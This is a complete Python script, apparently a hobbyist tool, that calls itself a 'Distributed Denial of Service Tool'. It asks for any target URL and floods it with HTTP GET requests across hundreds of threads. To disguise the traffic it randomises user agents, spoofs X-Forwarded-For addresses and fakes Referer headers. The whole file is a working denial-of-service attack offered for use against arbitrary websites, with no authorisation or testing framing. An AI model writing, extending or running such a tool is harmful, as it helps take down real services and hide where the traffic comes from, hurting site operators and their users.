import threading
import requests
import time
import random
import sys

# --- Configuration ---
DEFAULT_THREADS = 500 # Default number of threads to use
DEFAULT_RPS = 100     # Default requests per second per thread (approximate, actual may vary)
TIMEOUT =  7         # Timeout for each request in seconds
MAX_RETRIES = 3       # Max retries for failed requests

# --- Global Variables ---
TARGET_URL = ""
THREADS = 0
RPS_PER_THREAD = 0
ATTACK_COUNT = 0
STOP_EVENT = threading.Event()

# --- Helper Functions ---

def get_random_user_agent():
    """
    Returns a random, advanced user-agent string to mimic different browsers and devices.
    """
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36",
        "Mozilla/5.0 (iOS; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5",
    ]
    return random.choice(user_agents)

def get_advanced_headers():
    """
    Generates a set of advanced HTTP headers to make requests appear more legitimate.
    Includes a random User-Agent, Accept types, Accept-Language, and Keep-Alive.
    """
    user_agent = get_random_user_agent()
    headers = {
        "User-Agent": user_agent,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "DNT": "1" # Do Not Track header
    }
    # Add a random X-Forwarded-For IP to simulate different client IPs (basic attempt)
    headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    # Add a random Referer header to simulate traffic from other sites
    referrers = [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://duckduckgo.com/",
        "https://www.youtube.com/",
        "https://www.facebook.com/",
        "https://twitter.com/",
    ]
    headers["Referer"] = random.choice(referrers)
    
    return headers

def send_request(url, session):
    """
    Sends a single HTTP GET request to the target URL with advanced headers.
    Handles potential exceptions and retries.
    """
    global ATTACK_COUNT
    for retry in range(MAX_RETRIES):
        if STOP_EVENT.is_set():
            return

        headers = get_advanced_headers()
        try:
            # Using a session for persistent connections and header management
            response = session.get(url, headers=headers, timeout=TIMEOUT, allow_redirects=True)
            ATTACK_COUNT += 1
            # You can log response status if needed, but for DDoSing, we often just want load.
            # print(f"[Thread {threading.current_thread().name}] Status: {response.status_code}")
            return # Request successful
        except requests.exceptions.Timeout:
            # print(f"[Thread {threading.current_thread().name}] Request timed out. Retrying...")
            pass
        except requests.exceptions.ConnectionError:
            # print(f"[Thread {threading.current_thread().name}] Connection error. Retrying...")
            pass
        except requests.exceptions.RequestException as e:
            # print(f"[Thread {threading.current_thread().name}] An unexpected error occurred: {e}. Retrying...")
            pass
        time.sleep(0.1) # Small delay before retrying

    # print(f"[Thread {threading.current_thread().name}] Failed after {MAX_RETRIES} retries.")

def attack_thread():
    """
    Worker thread function that continuously sends requests to the target URL.
    Attempts to maintain the desired RPS_PER_THREAD.
    """
    # Use a session object for connection pooling and efficiency
    session = requests.Session()
    
    # Calculate sleep time to achieve RPS_PER_THREAD
    # If RPS_PER_THREAD is 0, it means unlimited requests
    sleep_interval = 0
    if RPS_PER_THREAD > 0:
        sleep_interval = 1.0 / RPS_PER_THREAD

    while not STOP_EVENT.is_set():
        start_time = time.time()
        send_request(TARGET_URL, session)
        end_time = time.time()
        
        # Adjust sleep to try and hit RPS_PER_THREAD
        if sleep_interval > 0:
            elapsed_time = end_time - start_time
            sleep_duration = sleep_interval - elapsed_time
            if sleep_duration > 0:
                time.sleep(sleep_duration)

def display_logo():
    """
    Displays an ASCII art logo with random colors for 'DDOS'
    """
    # ANSI color codes
    colors = [
        '\033[91m',  # Red
        '\033[92m',  # Green
        '\033[93m',  # Yellow
        '\033[94m',  # Blue
        '\033[95m',  # Magenta
        '\033[96m',  # Cyan
        '\033[97m',  # White
    ]
    reset = '\033[0m'  # Reset color
    
    # Randomly select a color for the logo
    selected_color = random.choice(colors)
    
    # ASCII art for "DDOS"
    logo_lines = [
        "██████╗ ██████╗  ██████╗ ███████╗",
        "██╔══██╗██╔══██╗ ██╔══██╗██╔════╝",
        "██║  ██║██║  ██║ ██║  ██║███████╗",
        "██║  ██║██║  ██║ ██║  ██║╚════██║",
        "██████╔╝██████╔╝ ██████╔╝███████║",
        "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝",
    ]
    colors = [
        '\033[91m',  # Red
        '\033[92m',  # Green
        '\033[93m',  # Yellow
        '\033[94m',  # Blue
        '\033[95m',  # Magenta
        '\033[96m',  # Cyan
        '\033[97m',  # White
    ]
    reset = '\033[0m'
    for i, line in enumerate(logo_lines):
        color = colors[i % len(colors)]
        print(f"{color}{line}{reset}")
    print(f"{selected_color}Distributed Denial of Service Tool{reset}\n")

def monitor_and_input():
    """
    Monitors status and handles user input for stopping the attack.
    """
    global TARGET_URL, THREADS, RPS_PER_THREAD

    # Display the logo at the start
    display_logo()
    
    print("--- DDOS Tool Configuration ---")
    
    while True:
        target_input = input("\033[91mEnter target website URL (e.g., https://example.com):\033[0m ").strip()
        if not target_input:
            print("Target URL cannot be empty. Please try again.")
            continue
        if not (target_input.startswith("http://") or target_input.startswith("https://")):
            print("URL must start with 'http://' or 'https://'. Correcting to 'https://'...")
            target_input = "https://" + target_input
        TARGET_URL = target_input
        break

    while True:
        threads_input = input(f"\033[92mEnter number of threads (default: {DEFAULT_THREADS}):\033[0m ").strip()
        if not threads_input:
            THREADS = DEFAULT_THREADS
            break
        try:
            val = int(threads_input)
            if val <= 0:
                print("Number of threads must be positive.")
                continue
            THREADS = val
            break
        except ValueError:
            print("Invalid input. Please enter a number.")

    while True:
        rps_input = input(f"\033[94mEnter requests per second per thread (0 for max, default: {DEFAULT_RPS}):\033[0m ").strip()
        if not rps_input:
            RPS_PER_THREAD = DEFAULT_RPS
            break
        try:
            val = int(rps_input)
            if val < 0:
                print("RPS cannot be negative.")
                continue
            RPS_PER_THREAD = val
            break
        except ValueError:
            print("Invalid input. Please enter a number.")
            
    print(f"\n--- Starting DDOS Attack on: {TARGET_URL} ---")
    print(f"Threads: {THREADS}, RPS per thread: {RPS_PER_THREAD} (Total theoretical RPS: {THREADS * RPS_PER_THREAD})")
    print("Press Ctrl+C to stop the attack at any time.")
    
    attack_threads = []
    
    for i in range(THREADS):
        thread = threading.Thread(target=attack_thread, name=f"Attacker-{i+1}")
        thread.daemon = True # Allow main program to exit even if threads are running
        attack_threads.append(thread)
        
    for thread in attack_threads:
        thread.start()

    start_time = time.time()
    try:
        while True:
            elapsed_time = time.time() - start_time
            print(f"\rTotal requests sent: {ATTACK_COUNT} | Elapsed time: {elapsed_time:.1f}s", end="", flush=True)
            time.sleep(1) # Update every second
    except KeyboardInterrupt:
        print("\n[!] Ctrl+C detected. Stopping attack...")
        STOP_EVENT.set() # Signal threads to stop

    for thread in attack_threads:
        thread.join(timeout=5) # Wait for threads to finish, with a timeout

    print(f"\nDDOS attack stopped. Total requests sent: {ATTACK_COUNT}")
    print("Exiting.")

if __name__ == "__main__":
    # Ensure requests library is installed. If not, inform the user.
    try:
        import requests
    except ImportError:
        print("Error: 'requests' library not found.")
        print("Please install it using: pip install requests")
        sys.exit(1)

    monitor_and_input()
